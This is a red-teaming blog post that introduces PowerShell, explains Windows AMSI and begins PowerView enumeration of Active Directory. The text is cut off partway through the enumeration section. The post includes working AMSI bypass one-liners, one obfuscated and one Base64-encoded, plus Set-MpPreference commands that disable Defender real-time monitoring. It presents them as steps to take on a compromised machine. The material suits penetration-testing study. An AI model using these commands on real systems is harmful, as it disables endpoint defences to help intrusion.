<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Active Directory - Offensive PowerShell" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Offensive-powershell/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Offensive-powershell/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-30T09:21:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory - Offensive PowerShell" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-03-30T09:21:00+05:30","datePublished":"2022-03-30T09:21:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Active Directory - Offensive PowerShell","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Offensive-powershell/"},"url":"https://0xstarlight.github.io/posts/Offensive-powershell/"}</script><title>Active Directory - Offensive PowerShell | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Active Directory - Offensive PowerShell</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory - Offensive PowerShell</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648612260" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-30 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3013 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/160738694-96fb918c-8506-4302-b9af-d869b772496f.png" alt="image" data-proofer-ignore></p><h1 id="introduction">Introduction</h1><p>Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations and concepts required to understand Active Directory.</p><p>If not so, you can give it a read from <a href="https://0xstarlight.github.io/posts/Active-Directory-Introduction/">here</a>.</p><p>This guide aims to explain the complete basics to advance enumeration code snippets in Offensive PowerShell and those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.</p><p>This article will not contain any Attacking PowerShell snippets, ie. Local Privilege Escalation, Domain Persistence, Golden ticket, Silver ticket. The following topics will be covered in a later article.</p><p>I will cover the following topics under this guide:</p><ol><li>Introduction to PowerShell<li>Bypassing AMSI and Real-Time-monitoring<li>Basic Enumeration<li>GPO Enumeration<li>ACL Enumeration<li>Trusts Enumeration<li>BloodHound Enumeration</ol><blockquote><p>Throughout the article, I will use <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">PowerView</a>, which is based on Powershell, to show how to retrieve information from Active Directory. This article has been created with references from a few other articles All used references for completing this article will be listed below. —</p></blockquote><h1 id="introduction-to-powershell">Introduction to PowerShell</h1><h2 id="what-is-powershell"><span class="mr-2">What is Powershell</span><a href="#what-is-powershell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.</p><p>This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called <em>cmdlets,</em> are written in .NET. Unlike other scripting languages and shell environments, the output of these <em>cmdlets</em> are objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one <em>cmdlet</em> to another). The normal format of a <em>cmdlet</em> is represented using <strong>Verb-Noun</strong>; for example the <em>cmdlet</em> to list commands is called <code class="language-plaintext highlighter-rouge">Get-Command.</code></p><p>Common verbs to use include:</p><ul><li>Get<li>Start<li>Stop<li>Read<li>Write<li>New<li>Out</ul><h2 id="using-get-help"><span class="mr-2">Using Get-Help</span><a href="#using-get-help" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Get-Help displays information about a <em>cmdlet.</em> To get help about a particular command, run the following:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Command-Name</span><span class="w">
</span></pre></table></code></div></div><p>You can also understand how exactly to use the command by passing in the <code class="language-plaintext highlighter-rouge">-examples</code> flag. This would return output like the following:</p><p><img data-src="https://i.imgur.com/U5Mlirh.png" alt="" data-proofer-ignore></p><h2 id="using-get-command"><span class="mr-2">Using Get-Command</span><a href="#using-get-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Get-Command gets all the <em>cmdlets</em> installed on the current Computer. The great thing about this <em>cmdlet</em> is that it allows for pattern matching like the following</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Get-Command</span><span class="w"> </span><span class="nx">Verb-</span><span class="o">*</span><span class="w">
</span><span class="c"># OR</span><span class="w">
</span><span class="n">Get-Command</span><span class="w"> </span><span class="o">*</span><span class="nt">-Noun</span><span class="w">
</span></pre></table></code></div></div><p>Running the following to view all the <em>cmdlets</em> for the verb new displays the following:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-Command</span><span class="w"> </span><span class="nx">New-</span><span class="o">*</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://i.imgur.com/KEzbPUI.png" alt="" data-proofer-ignore></p><h2 id="object-manipulation"><span class="mr-2">Object Manipulation</span><a href="#object-manipulation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In the previous task, we saw how the output of every <em>cmdlet</em> is an object. If we want to actually manipulate the output, we need to figure out a few things:</p><ul><li>passing output to other <em>cmdlets</em><li>using specific object <em>cmdlets</em> to extract information</ul><p>The Pipeline(<code class="language-plaintext highlighter-rouge">|</code>) is used to pass output from one <em>cmdlet</em> to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the <em>cmdlet</em> and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a <em>cmdlet</em> to the Get-Member <em>cmdlet</em></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w">
</span></pre></table></code></div></div><p>An example of running this to view the members for Get-Command is:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-Command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="nt">-MemberType</span><span class="w"> </span><span class="nx">Method</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://i.imgur.com/OlwXSbS.png" alt="" data-proofer-ignore></p><p>From the above flag in the command, you can see that you can also select between methods and properties.</p><h2 id="creating-objects-from-previous-cmdlets"><span class="mr-2">Creating Objects From Previous <em>cmdlets</em></span><a href="#creating-objects-from-previous-cmdlets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the <code class="language-plaintext highlighter-rouge">Select-Object</code> <em>cmdlet.</em></p><p>Here’s an example of listing the directories and just selecting the mode and the name:</p><p><img data-src="https://i.imgur.com/Zdxicjj.png" alt="" data-proofer-ignore></p><p>You can also use the following flags to select particular information:</p><ul><li>first - gets the first x object<li>last - gets the last x object<li>unique - shows the unique objects<li>skip - skips x objects</ul><h2 id="filtering-objects"><span class="mr-2">Filtering Objects</span><a href="#filtering-objects" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the <code class="language-plaintext highlighter-rouge">Where-Object</code> to filter based on the value of properties.</p><p>The general format of the using this <em>cmdlet</em> is</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">PropertyName</span><span class="w"> </span><span class="nt">-operator</span><span class="w"> </span><span class="nx">Value</span><span class="w">
</span><span class="c"># OR</span><span class="w">
</span><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PropertyName</span><span class="w"> </span><span class="nt">-operator</span><span class="w"> </span><span class="n">Value</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.</p><p><strong>Powershell is quite sensitive so make sure you don’t put quotes around the command!</strong></p><p>Where <code class="language-plaintext highlighter-rouge">-operator</code> is a list of the following operators:</p><ul><li>-Contains: if any item in the property value is an exact match for the specified value<li>-EQ: if the property value is the same as the specified value<li>-GT: if the property value is greater than the specified value</ul><p>For a full list of operators, use <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-6">this</a> link.</p><p>Here’s an example of checking the stopped processes:</p><p><img data-src="https://i.imgur.com/obTvbWW.png" alt="" data-proofer-ignore></p><h2 id="sort-object"><span class="mr-2">Sort Object</span><a href="#sort-object" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>When a <em>cmdlet</em> outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a <em>cmdlet</em> to the <code class="language-plaintext highlighter-rouge">Sort-Object</code> <em>cmdlet</em>.</p><p>The format of the command would be</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w">
</span></pre></table></code></div></div><p>Here’s an example of sort the list of directories:</p><p><img data-src="https://i.imgur.com/xob5cqe.png" alt="" data-proofer-ignore></p><h1 id="bypassing-amsi-and-real-time-monitoring">Bypassing AMSI and Real-Time-monitoring</h1><p>Once we get Initial access to our victim machine, we can upload our PowerShell scripts to start the enumeration process. We may notice that our shells get killed or fail at uploading because AV catches them.</p><p>Even tho AV evasion is a massive topic in itself. I will provide a brief explanation.</p><p>The Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate into antimalware products. AMSI will scan payloads and scripts before execution inside of the runtime. From Microsoft, “The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that’s present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.”</p><p>For more information about AMSI, check out the Windows docs, <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/">https://docs.microsoft.com/en-us/windows/win32/amsi/</a></p><p>Find an example of how data flows inside of Windows security features below.</p><p><img data-src="https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg" alt="" data-proofer-ignore></p><p>AMSI will send different response codes based on the results of its scans. Find a list of response codes from AMSI below.</p><ul><li>AMSI_RESULT_CLEAN = 0<li>AMSI_RESULT_NOT_DETECTED = 1<li>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384<li>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479<li>AMSI_RESULT_DETECTED = 32768</ul><p>AMSI is fully integrated into the following Windows components.</p><ul><li>User Account Control, or UAC<li>PowerShell<li>Windows Script Host (wscript and cscript)<li>JavaScript and VBScript<li>Office VBA macros</ul><p>AMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.</p><p>We can look at what PowerShell security features physically look like and are written using InsecurePowerShell, <a href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master">https://github.com/PowerShell/PowerShell/compare/master…cobbr:master</a> maintained by Cobbr. InsecurePowerShell is a GitHub repository of PowerShell with security features removed; this means we can look through the compared commits and identify any security features. AMSI is only instrumented in twelve lines of code under</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</span><span class="w">
</span></pre></table></code></div></div><p>Find the C# code used to instrument AMSI below.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kt">var</span> <span class="n">scriptExtent</span> <span class="p">=</span> <span class="n">scriptBlockAst</span><span class="p">.</span><span class="n">Extent</span><span class="p">;</span>  
<span class="k">if</span> <span class="p">(</span><span class="n">AmsiUtils</span><span class="p">.</span><span class="nf">ScanContent</span><span class="p">(</span><span class="n">scriptExtent</span><span class="p">.</span><span class="n">Text</span><span class="p">,</span> <span class="n">scriptExtent</span><span class="p">.</span><span class="n">File</span><span class="p">)</span> <span class="p">==</span> <span class="n">AmsiUtils</span><span class="p">.</span><span class="n">AmsiNativeMethods</span><span class="p">.</span><span class="n">AMSI_RESULT</span><span class="p">.</span><span class="n">AMSI_RESULT_DETECTED</span><span class="p">)</span>  
<span class="p">{</span>  
  <span class="kt">var</span> <span class="n">parseError</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ParseError</span><span class="p">(</span><span class="n">scriptExtent</span><span class="p">,</span> <span class="s">"ScriptContainedMaliciousContent"</span><span class="p">,</span> <span class="n">ParserStrings</span><span class="p">.</span><span class="n">ScriptContainedMaliciousContent</span><span class="p">);</span>  
  <span class="k">throw</span> <span class="k">new</span> <span class="nf">ParseException</span><span class="p">(</span><span class="k">new</span><span class="p">[]</span> <span class="p">{</span> <span class="n">parseError</span> <span class="p">});</span>  
<span class="p">}</span>  
  
<span class="k">if</span> <span class="p">(</span><span class="n">ScriptBlock</span><span class="p">.</span><span class="nf">CheckSuspiciousContent</span><span class="p">(</span><span class="n">scriptBlockAst</span><span class="p">)</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>  
<span class="p">{</span>
  <span class="n">HasSuspiciousContent</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>  
<span class="p">}</span>
</pre></table></code></div></div><p>Third-parties can also instrument AMSI in their products using the methods outlined below.</p><ul><li>AMSI Win32 API, <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions</a><li>AMSI COM Interface, <a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream">https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream</a></ul><h2 id="bypass-amsi"><span class="mr-2">Bypass AMSI</span><a href="#bypass-amsi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell. There are a large number of bypasses for AMSI available, below are a list of few AMSI bypasses.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># AMSI obfuscation</span><span class="w">
</span><span class="n">sET-ItEM</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'blE:1q2'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'uZx'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">GeT-VariaBle</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"1Q2U"</span><span class="w"> </span><span class="o">+</span><span class="s2">"zX"</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nt">-VaL</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w"> </span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'Util'</span><span class="p">,</span><span class="s1">'A'</span><span class="p">,</span><span class="s1">'Amsi'</span><span class="p">,</span><span class="s1">'.Management.'</span><span class="p">,</span><span class="s1">'utomation.'</span><span class="p">,</span><span class="s1">'s'</span><span class="p">,</span><span class="s1">'System'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'amsi'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'InitFaile'</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'Stat'</span><span class="p">,</span><span class="s1">'i'</span><span class="p">,</span><span class="s1">'NonPubli'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w"> </span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="c">#Base64</span><span class="w">
</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.'</span><span class="o">+</span><span class="err">$</span><span class="p">([</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'QQBtAHMAaQBVAHQAaQBsAHMA'</span><span class="p">))))</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="err">$</span><span class="p">([</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='</span><span class="p">))),</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span><span class="c">#On PowerShell 6</span><span class="w">
</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'s_amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><h2 id="bypass-real-time-monitoring"><span class="mr-2">Bypass Real-Time-monitoring</span><a href="#bypass-real-time-monitoring" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Powershell</span><span class="w"> </span><span class="nx">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span><span class="n">Powershell</span><span class="w"> </span><span class="nx">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableIOAVProtection</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></pre></table></code></div></div><h1 id="basic-enumeration">Basic Enumeration</h1><p>Since we bypassed AMSI and Real-Time protection, we can start with Domain Enumeration and map various entities, trusts, relationships and privileges for the target domain.</p><h2 id="powerview-enumeration"><span class="mr-2">PowerView Enumeration</span><a href="#powerview-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="get-current-domain"><span class="mr-2">Get current domain</span><a href="#get-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetDomain</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-object-of-another-domain"><span class="mr-2">Get object of another domain</span><a href="#get-object-of-another-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
